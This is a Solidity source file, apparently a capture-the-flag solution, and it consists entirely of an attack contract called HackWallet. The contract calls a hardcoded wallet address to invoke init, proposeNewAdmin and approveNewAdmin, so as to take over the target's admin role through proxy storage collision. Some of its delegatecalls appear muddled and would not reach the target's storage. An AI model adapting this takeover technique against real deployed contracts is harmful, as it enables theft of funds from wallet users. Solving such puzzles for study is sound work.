contracts/WallePuzzle.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;


contract HackWallet{
    address public owner;
    address public admin;

    mapping(address => bool) public whitelisted;
    mapping( address => uint256) public balances;

    address his =0x4D9ce6713c212E3267f16f10EeD0aD373c60dd88;
    constructor()public {
        owner = msg.sender;
        admin = msg.sender;
    }

    function calldcallInit()public{
        address(this).call(abi.encodeWithSignature('delcallInit()'));
    }

    function callInit()public{
        his.call(abi.encodeWithSignature('init(uint256)', 666666));
    }

    function callproposeNewAdmin()public{
        his.call(abi.encodeWithSignature('proposeNewAdmin(address)', owner));
    }

    function delegatecallapproveNewAdmin()public{
        his.delegatecall(abi.encodeWithSignature('approveNewAdmin(address)', owner));
    }

    
    function delcallInit()public{
        his.delegatecall(abi.encodeWithSignature('init(uint256)', 777777));
    }
}

